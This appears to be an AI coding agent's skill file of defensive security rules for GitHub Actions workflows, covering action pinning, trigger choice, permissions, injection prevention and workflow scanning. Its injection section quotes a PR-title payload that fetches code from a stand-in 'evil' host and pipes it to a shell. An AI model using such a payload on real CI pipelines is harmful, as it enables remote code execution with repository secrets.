---
name: gha-security
description: Security rules for GitHub Actions workflows. Use when creating or editing any file under .github/workflows/ or .github/actions/, or touching CODEOWNERS / branch protection for CI.
---

Apply every rule below when authoring or editing a workflow. The repo's Actions settings **require** SHA-pinned actions (`sha_pinning_required`) and restrict third-party actions to an allow list — an unpinned or unlisted action will fail to run. Never relax a rule to make CI pass; fix the workflow.

## 1. Pin every action to a full commit SHA

Tags and branches are mutable — a compromised maintainer (or a force-pushed tag) can swap the code behind `@v4` without changing your file. A 40-char commit SHA is immutable.

```yaml
# ✅ correct — full SHA + version comment
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

# ❌ wrong — mutable ref
uses: actions/checkout@v7
uses: actions/checkout@main
```

Applies to **all** actions including first-party `actions/*`, `pnpm/*`, and any reusable workflow called via `uses:`. The trailing `# vX.Y.Z` comment is mandatory (it keeps humans sane and lets tooling maintain pins).

To resolve a tag to its SHA:
```bash
gh api repos/<owner>/<repo>/git/refs/tags/<tag> --jq '.object.sha'
# if that returns an annotated-tag object, dereference it:
gh api repos/<owner>/<repo>/git/tags/<sha> --jq '.object.sha'
```

## 2. Third-party actions need allow-list entry

Repo setting: Actions → General → "Allow <owner> actions and select non-<owner> actions" with GitHub-created actions trusted and a comma-separated allow list (`<owner>/<action>@*`). Adding a new third-party action to a workflow requires adding it to that list too:

```bash
gh api -X PUT repos/digorgonzola/roster/actions/permissions/selected-actions \
  -F github_owned_allowed=true -F verified_allowed=false \
  -f "patterns_allowed[]=pnpm/action-setup@*" \
  -f "patterns_allowed[]=zizmorcore/zizmor-action@*"
```

Prefer actions from `actions/*` (GitHub-owned) where one exists. Vendor small third-party actions into `.github/actions/` (like `wait-for-required-checks`) instead of consuming them remotely when practical.

## 3. Protect the workflow definition itself

Anyone who can open a PR can edit a workflow file in that PR. Layers that stop a malicious edit from running with privileges:

- **CODEOWNERS** — `.github/CODEOWNERS` assigns `/.github/`, `/.github/workflows/`, and `CODEOWNERS` itself to `@digorgonzola`. Any workflow change then requires owner review via its own PR.
- **Branch protection** — enable "Require review from Code Owners" on `main`. CODEOWNERS *requests* the review; branch protection *blocks* the merge. Don't weaken either.
- **Choose the trigger deliberately** — see §4. The event decides *which copy* of the workflow runs and *what credentials* it gets.

## 4. `pull_request` vs `pull_request_target` — pick by what the job does

These are NOT interchangeable. The difference is security-critical:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow def that runs | **from the PR head** (PR can modify it) | **from the base branch** (PR cannot modify it) |
| Secrets / write token on fork PRs | ❌ none, read-only token | ✅ full secrets + write token |
| Checking out & running PR code | safe | **DANGEROUS** |

Rules:

- **Build / lint / test workflows that execute PR code** (e.g. `ci.yml` running `pnpm install` + `pnpm build`) → keep `pull_request`. Forks get a read-only token and **no secrets**, so a malicious PR editing the workflow cannot exfiltrate anything. This is the safe default — do **not** "upgrade" it to `pull_request_target`.
- **`pull_request_target` is only for jobs that must run with secrets/write and do NOT execute untrusted PR code** — labelling, triaging, posting comments, status aggregation (like `required-checks.yml`). The base-branch copy runs, so the PR can't tamper with it.
- **Never** combine `pull_request_target` with `actions/checkout` of the PR head ref (`github.event.pull_request.head.sha`) followed by build/test/`run` of that code — that runs attacker code with your secrets. This is the single most exploited Actions misconfiguration.

If a workflow genuinely must build/test untrusted PR code **and then** act with secrets, use the **split pattern** instead of `pull_request_target`:

1. An unprivileged `pull_request` workflow builds the PR code (no secrets) and uploads results as an artifact.
2. A separate `workflow_run` workflow (triggered on the first one completing) runs privileged, downloads the artifact, and acts.

Harden the privileged half:
- Treat every downloaded artifact as **untrusted** — extract to a temp dir (`/tmp`), never auto-expand over the workspace (**artifact poisoning**).
- Validate artifact contents before use; never pipe them into `$GITHUB_ENV` / `$GITHUB_OUTPUT` (see §6).
- Filter on `github.event.workflow_run.conclusion == 'success'` and the expected source branch.

If you must use `pull_request_target` directly: check out `github.event.pull_request.head.sha` (immutable) **not** `head.ref` (mutable race / TOCTOU), gate on a trusted-actor or same-repo check (`github.event.pull_request.head.repo.full_name == github.repository`), and still never `run:` the checked-out code.

Avoid `issue_comment` / ChatOps triggers as approval gates — they're TOCTOU-prone and bypass PR review. Prefer a label gate pinned to a specific commit SHA.

## 5. Least-privilege permissions

Set a read-only (or empty) default at the top, escalate per-job only as needed:
```yaml
permissions: {}          # or contents: read
jobs:
  comment:
    permissions:
      pull-requests: write   # only the job that needs it
```
Never use blanket `permissions: write-all`.

## 6. Prevent injection from untrusted input

**Untrusted sources** (attacker-controlled in a fork PR): `github.event.*` fields (PR/issue title, body, branch/ref name, author login, commit message), `git` output (`git log`, `git diff-tree`), downloaded artifacts, and third-party action outputs.

**Script injection** — never interpolate an untrusted value straight into `run:`:
```yaml
# ❌ injection — PR title "$(curl evil|sh)" executes
- run: echo "${{ github.event.pull_request.title }}"

# ✅ pass through an env var, quote on use
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Environment / output injection** — writing untrusted content into the `$GITHUB_ENV` or `$GITHUB_OUTPUT` files lets an attacker inject arbitrary env vars (e.g. `LD_PRELOAD`, `PATH`) or clobber another step's outputs. Never echo untrusted data into them; if you must, validate against a strict allowlist first and beware multiline payloads.

**Path injection** — don't build file paths from untrusted input without validation (path traversal into the workspace or runner).

## 7. Scan workflows automatically

Manual review misses things:

**zizmor (in use)** — `.github/workflows/zizmor.yml` runs `zizmorcore/zizmor-action` on every `.github/**` change, and `.githooks/pre-commit` runs the same audit locally (offline, regular persona) whenever a workflow file is staged, so misconfigs are caught before push. Catches the workflow classes in this skill: unpinned actions, template/script injection, dangerous `pull_request_target`, excessive permissions, artifact/cache issues, self-hosted exposure. Runs with `advanced-security: false` → GitHub annotations + **fails the job on findings**. Don't fix a zizmor failure by silencing it — fix the workflow, or add a justified `# zizmor: ignore[rule]` with a reason. Keep the action **and** its `version:` pinned (§1).

This repo is **public**, so GitHub code scanning is free — flipping `advanced-security: true` would upload SARIF to the code-scanning dashboard instead of failing the job. Keep `false`: a hard CI failure is the stronger gate.

## 8. Self-hosted runners

Never run **public-repo or fork PR** workloads on a self-hosted runner — untrusted code executes on a host you own and persists state between jobs. Use ephemeral GitHub-hosted runners for those; reserve self-hosted for trusted, internal-only workflows. This repo is public: GitHub-hosted runners only.

## 9. Other defaults

- `concurrency:` group with `cancel-in-progress: true` to kill superseded runs.
- `persist-credentials: false` on `actions/checkout` unless the job pushes back.
- Prefer OIDC (short-lived federated creds) over long-lived cloud secrets.
- No dependency-update bot maintains action pins here yet — when bumping an action, update the SHA **and** the `# vX.Y.Z` comment together. If a bot is added later, prefer Renovate with `helpers:pinGitHubActionDigests`.
- Gate privileged jobs behind a GitHub *Environment* with required reviewers when they touch prod.

## Pre-merge checklist for any workflow change

- [ ] Every `uses:` is a full SHA with a `# vX.Y.Z` comment
- [ ] Any new third-party action is added to the repo's Actions allow list (§2)
- [ ] Trigger event matches what the job does (§4); no `pull_request_target` + checkout-and-run of PR head
- [ ] Top-level `permissions:` is empty or read-only; per-job escalation is minimal
- [ ] No untrusted input (`${{ github.event.* }}`, git output, artifacts) in `run:`, `$GITHUB_ENV`, or `$GITHUB_OUTPUT`
- [ ] Downloaded artifacts treated as untrusted (temp dir, validated)
- [ ] No untrusted PR workload on a self-hosted runner
- [ ] CODEOWNERS covers `.github/` so this change required owner review
